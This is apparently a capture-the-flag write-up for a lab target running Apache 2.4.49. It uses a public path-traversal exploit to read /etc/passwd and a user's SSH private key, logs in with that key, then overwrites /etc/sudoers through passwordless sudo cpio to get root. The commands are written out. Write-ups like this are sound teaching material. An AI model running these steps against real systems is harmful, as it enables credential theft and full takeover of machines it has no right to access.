# BRCTF

https://bctf.africa/

In this CTF we are given target machines

<br>

## Target list

- [apache](#apache)


<br>

## apache

port 80 is open

<img width="216" alt="image" src="https://github.com/Aftab700/Writeups/assets/79740895/29b257f2-f236-4076-ad40-7d3e204862cc">

from the response header we notice that it is running on `Apache/2.4.49` version and by googling we know that it is [vulnerable to LFI](https://www.exploit-db.com/exploits/50383)

using the [exploite](https://www.exploit-db.com/exploits/50383) we can get the `id_rsa` file

```
bash apache_PoC.txt targets.txt /home/BRCTF/.ssh/id_rsa > id_rsa
```

now using this key file we can login to ssh

```
ssh BRCTF@10.0.13.0 -i .\id_rsa
```

to know the username `BRCTF` we read the `/etc/passwd` file using the same exploite

we are able to login and we can use `cpio` with sudo without password

<img width="612" alt="image" src="https://github.com/Aftab700/Writeups/assets/79740895/035a6044-63df-4077-8d65-0d9b4436ec7f">

we can use cpio to change the `/etc/sudoers` file so we can run any binary with sudo without password

we can use the following commands to read the current `sudoers` file

```
echo "/etc/sudoers" > namelist
sudo cpio -o < namelist > archive
cat archive
```

it will save the files in namelist to archive

now we have to add `BRCTF ALL=NOPASSWD: ALL` in sudoers file

```
echo "RGVmYXVsdHMgICBlbnZfcmVzZXQNCkRlZmF1bHRzICAgbWFpbF9iYWRwYXNzDQpEZWZhdWx0cyAgIHNlY3VyZV9wYXRoPSIvdXNyL2xvY2FsL3NiaW46L3Vzci9sb2NhbC9iaW46L3Vzci9zYmluOi91c3IvYmluOi9zYmluOi9iaW4iDQoNCiMgSG9zdCBhbGlhcyBzcGVjaWZpY2F0aW9uDQoNCiMgVXNlciBhbGlhcyBzcGVjaWZpY2F0aW9uDQoNCiMgQ21uZCBhbGlhcyBzcGVjaWZpY2F0aW9uDQoNCiMgVXNlciBwcml2aWxlZ2Ugc3BlY2lmaWNhdGlvbg0Kcm9vdCAgQUxMPShBTEw6QUxMKSBBTEwNCkJSQ1RGIEFMTD1OT1BBU1NXRDogQUxMDQoNCiMgQWxsb3cgbWVtYmVycyBvZiBncm91cCBzdWRvIHRvIGV4ZWN1dGUgYW55IGNvbW1hbmQNCiVzdWRvIEFMTD0oQUxMOkFMTCkgQUxMDQoNCiMgU2VlIHN1ZG9lcnMoNSkgZm9yIG1vcmUgaW5mb3JtYXRpb24gb24gIkBpbmNsdWRlIiBkaXJlY3RpdmVzOg0KDQpAaW5jbHVkZWRpciAvZXRjL3N1ZG9lcnMuZA==" | base64 -d > sudoers
echo sudoers > namelist
sudo cpio --no-preserve-owner -p /etc < namelist
```

this base64 content is our modified file and we save it in current directory\
`--no-preserve-owner` : Do not change the ownership of the files\
It will save our modified file in /etc folder overwriting the existing one and without changing the file ownership or it will create error

<img width="531" alt="image" src="https://github.com/Aftab700/Writeups/assets/79740895/30d1a28a-3078-45da-8abd-149d99cfbac6">

now we are root

<br>



